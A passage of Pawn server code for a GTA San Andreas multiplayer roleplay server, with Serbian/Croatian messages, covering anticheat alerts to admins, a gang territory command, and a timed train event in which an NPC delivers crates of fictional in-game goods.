    format( globalstring, sizeof( globalstring ), "| V:AC | Moguc AirBreak || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( playerid ), playerid );
    AdminPoruka( ANTICHEAT, globalstring );
    return 1;
}

public OnPlayerSpeedCheat(playerid, speedtype) {

    if(AdminDuty[playerid]) return 0;

    if(speedtype == 0) {

        format( globalstring, sizeof( globalstring ), "| V:AC | Moguc Speed On Foot || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( playerid ), playerid );
        AdminPoruka( ANTICHEAT, globalstring );
        return 1;
    }

    if(speedtype == 1) {

        format( globalstring, sizeof( globalstring ), "| V:AC | Moguc Speed U Vozilu || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( playerid ), playerid );
        AdminPoruka( ANTICHEAT, globalstring );
        return 1;
    }

    if(speedtype == 3) {

        format( globalstring, sizeof( globalstring ), "| V:AC | Moguc Speed U Avionu || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( playerid ), playerid );
        AdminPoruka( ANTICHEAT, globalstring );
        return 1;
    }

    return 1;
}

public OnPlayerJetpackCheat(playerid) {

    if(AdminDuty[playerid]) return 0;

    format( globalstring, sizeof( globalstring ), "| V:AC | Moguc Jetpack Hack || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( playerid ), playerid );
    AdminPoruka( ANTICHEAT, globalstring );

    return 1;
}

public OnPlayerBreakAir(playerid, breaktype) {

    if(AdminDuty[playerid]) return 0;

    format( globalstring, sizeof( globalstring ), "| V:AC | Moguc AirBreak ili Teleport Hack || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( playerid ), playerid );
    AdminPoruka( ANTICHEAT, globalstring );

    return 1;
}

stock PrivatnoVozilo(veh)
{
    for(new vehid = 1; vehid < MAX_CARS; vehid++)
    {
        new veh_File[50];
        format(veh_File, sizeof(veh_File), V_FILE, vehid);
        if(fexist(veh_File))
        {
            if(VehicleInfo[vehid][vID] == veh) return 1;
        }
    }
    return 0;
}

stock getVehicleScriptID(vehicle) {

    for(new vehid = 1; vehid < MAX_CARS; vehid++)
    {
        new veh_File[50];
        format(veh_File, sizeof(veh_File), V_FILE, vehid);
        if(fexist(veh_File))
        {
            if(VehicleInfo[vehid][vID] == vehicle) return vehid;
        }
    }
    return -1;
}

CMD:teritorije(playerid) {

    if(!ClanIlegalaca(playerid)) return SendErrorMessage(playerid, "Samo clanovi bande/mafije!");

    new DialogStrgEx1[ 4000 ];
    new str[128];
    for( new i = 1; i < MAX_GZONE; i++ ) {
    
        if(gZoneInfo[i][gZoneGangID] == PlayerInfo[playerid][xClan]) {

            format(str, sizeof(str), "Teritorija u %s | Moze se zauzeti za %d\n", getZoneLocation(i), gZoneInfo[i][gZoneTime]);
            strcat(DialogStrgEx1, str);
        }
    }
    if(isnull(DialogStrgEx1)) return SendErrorMessage(playerid, "Tvoja organizacija nema zauzetih teritorija!");
    SPD( playerid, 0, DSMSG, ""SRVBOJA1SCM"Zauzete Teritorije", DialogStrgEx1, "Potvrdi", "" );

    return 1;
}

// CMD:istovarikutije(playerid) {

//     if(PlayerInfo[playerid][xClan] == 0)
//         return SendErrorMessage(playerid, "Samo clanovi organizacije!");

//     new orgID = PlayerInfo[playerid][xClan];

//     if(!IsPlayerInRangeOfPoint(playerid, 40.0, OI[ orgID ][ oPozExtX], OI[ orgID ][ oPozExtY], OI[ orgID ][ oPozExtZ ] ))
//         return SendErrorMessage(playerid, "Moras biti blizu svoje organizacije!");

//     if(!IsPlayerInAnyVehicle(playerid))
//         return SendErrorMessage(playerid, "Nisi u vozilu!");

//     new veh = GetPlayerVehicleID(playerid);

//     if( TipVozila[ veh ] != ORGANIZACIJSKO_VOZILO ) 
//         return SendErrorMessage(playerid, "Ovo nije organizacijsko vozilo!");


//     if( OrgaVozila[ veh ] != PlayerInfo[ playerid ][ xClan ]) 
//         return SendErrorMessage(playerid, "Ovo nije vozilo tvoje organizacije!");
           
//     if(vehBrojKutija[veh] == 0)
//         return SendErrorMessage(playerid, "Niste utovarili kutije sa voza u ovo vozilo!");

//     giveTrainAward(playerid, vehBrojKutija[veh]);
//     vehBrojKutija[veh] = 0;

//     SendInfoMessage(playerid, "Uspesno si dostavio kutije u svoju organizaciju!");

//     return 1;
// }

createTrainObjects() {

    destroyTrainObjects();

    trainObjects[0] = CreateDynamicObject(1271, trainBoxPos[0][0], trainBoxPos[0][1], trainBoxPos[0][2], 0.000000, 0.000000, -16.899999, -1, -1, -1, 250.00, 250.00); 
    trainObjects[1] = CreateDynamicObject(1271, trainBoxPos[1][0], trainBoxPos[1][1], trainBoxPos[1][2], 0.000000, 0.000000, -16.899999, -1, -1, -1, 250.00, 250.00); 
    trainObjects[2] = CreateDynamicObject(1271, trainBoxPos[2][0], trainBoxPos[2][1], trainBoxPos[2][2], 0.000000, 0.000000, -16.899999, -1, -1, -1, 250.00, 250.00); 
    trainObjects[3] = CreateDynamicObject(1271, trainBoxPos[3][0], trainBoxPos[3][1], trainBoxPos[3][2], 0.000000, 0.000000, -2.399994, -1, -1, -1, 250.00, 250.00); 
    trainObjects[4] = CreateDynamicObject(1271, trainBoxPos[4][0], trainBoxPos[4][1], trainBoxPos[4][2], 0.000000, 0.000000, -2.399994, -1, -1, -1, 250.00, 250.00); 
    trainObjects[5] = CreateDynamicObject(1271, trainBoxPos[5][0], trainBoxPos[5][1], trainBoxPos[5][2], 0.000000, 0.000000, -2.399994, -1, -1, -1, 250.00, 250.00); 

    for(new i = 0; i < 6; i++) {
        activeTrainBox[i] = true;

        trainBoxLabel[i] = CreateDynamic3DTextLabel(""col_ljub"Da pokupis kutiju koristi\n"col_white"'LEVI KLIK'", 0xFFFFFFFF, trainBoxPos[i][0], trainBoxPos[i][1], trainBoxPos[i][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);
    }

    return 1;
}

destroyTrainObjects() {

    for(new i = 0; i < 6; i++) {
        if(IsValidDynamicObject(trainObjects[i])) {

            DestroyDynamicObject(trainObjects[i]);
            DestroyDynamic3DTextLabel(trainBoxLabel[i]);
            activeTrainBox[i] = false;
        }
    }

    return 1;
}

giveTrainAward(playerid, brojKutija) {

    new orgID = PlayerInfo[playerid][xClan];
    if(trainVrednost == 1) {
        //Daj marihuanu
        return 1;
    }
    if(trainVrednost == 2) {
        //Daj koks
        return 1;
    }
    if(trainVrednost == 3) {
        //Daj mats
        return 1;
    }
    if(trainVrednost == 4) {
        //Daj meth
        return 1;
    }
    if(trainVrednost == 5) {
        //Daj zlato
        return 1;
    }

    return 1;
}

task trainActivate[60000]() {

    if(trainActive) return 1;

    new hours, minutes;
    gettime(hours, minutes);
    if(minutes != 1 || minutes != 2 || minutes != 3) return 1;

    if(hours == 12) {
        startTrain(1); //marihuana
        return 1;
    }
    if(hours == 15) {
        startTrain(2); //kokain
        return 1;
    }
    if(hours == 18) {
        startTrain(3); //mats
        return 1;
    }
    if(hours == 21) {
        startTrain(4); //meth
        return 1;
    }
    if(hours == 0) {
        startTrain(5); //zlato
        return 1;
    }

    return 1;
}

startTrain(number) {

    trainActive = true;
    trainArrived = false;
    trainTimer = TRAIN_TIMER;
    trainTDActive = true;
    trainVrednost = number;

    defer trainTimerCheck();

    return 1;
}

timer trainTimerCheck[1000]() {

    if(trainTimer != 0) {

        trainTimer--;
        changeTrainTD();
        defer trainTimerCheck();

        return 1;
    }
    else {

        trainTDActive = false;
        changeTrainTD();

        foreach(new i : Player) {

            if(PlayerInfo[i][xClan] != 0)
                SendTrainMessage(i, "Voz stize na tajnu lokaciju za 1 minut!");
        }

        TrainDriverVehicle = AddStaticVehicle(537,2864.7500,1246.3289,12.3495,360.0000,1,1);

        TrainDriverNPC = FCNPC_Create("TrainDriver");
        SetPlayerColor(TrainDriverNPC, 0xFFFFFF00);
        if(TrainDriverNPC != INVALID_PLAYER_ID) {
            FCNPC_Spawn(TrainDriverNPC, 255, 0.0, 0.0, 0.0);
            FCNPC_SetHealth( TrainDriverNPC, 100 );
            FCNPC_SetInterior( TrainDriverNPC, 0 );
            FCNPC_SetVirtualWorld( TrainDriverNPC, 0 );
            FCNPC_SetInvulnerable(TrainDriverNPC, true);
            FCNPC_PutInVehicle(TrainDriverNPC, TrainDriverVehicle, 0);
            TrainDriverPlaybackCycle = 0;
            TrainDriverNextPlayback();
        }
        return 1;
    }
}

changeTrainTD() {

    foreach(new i : Player) {

        for(new td = 0; td < 5; td++) {
            TextDrawHideForPlayer(i, VozStizeTD[td]);
        }

        if(!trainTDActive) continue;
        if(PlayerInfo[i][xClan] == 0) continue;

        new str[32];
        format(str, sizeof(str), "%d", trainTimer);
        TextDrawSetString(VozStizeTD[4], str);

        for(new td = 0; td < 5; td++) {

            TextDrawShowForPlayer(i, VozStizeTD[td]);
        }
    }

    return 1;
}

TrainDriverNextPlayback() {
    switch(TrainDriverPlaybackCycle) {
        case 0: {
            FCNPC_StartPlayingPlayback(TrainDriverNPC, "Stanica_Loc");
        }
        case 1: {
            FCNPC_StartPlayingPlayback(TrainDriverNPC, "Loc_Ide");
        }
    }
}

public FCNPC_OnFinishPlayback(npcid) {

    if(npcid == TrainDriverNPC && TrainDriverPlaybackCycle == 0) {

        trainArrived = true;

        createTrainObjects();

        defer cekajVoz();
        return 1;
    }

    if(npcid == TrainDriverNPC && TrainDriverPlaybackCycle == 1) {

        DestroyVehicle(TrainDriverVehicle);
        FCNPC_Destroy(TrainDriverNPC);
        TrainDriverPlaybackCycle = 0;
        return 1;
    }

    return 1;
}

timer cekajVoz[180000]() {

    TrainDriverPlaybackCycle = 1;
    trainArrived = false;
    trainActive = false;
    destroyTrainObjects();
    TrainDriverNextPlayback();

    return 1;
}
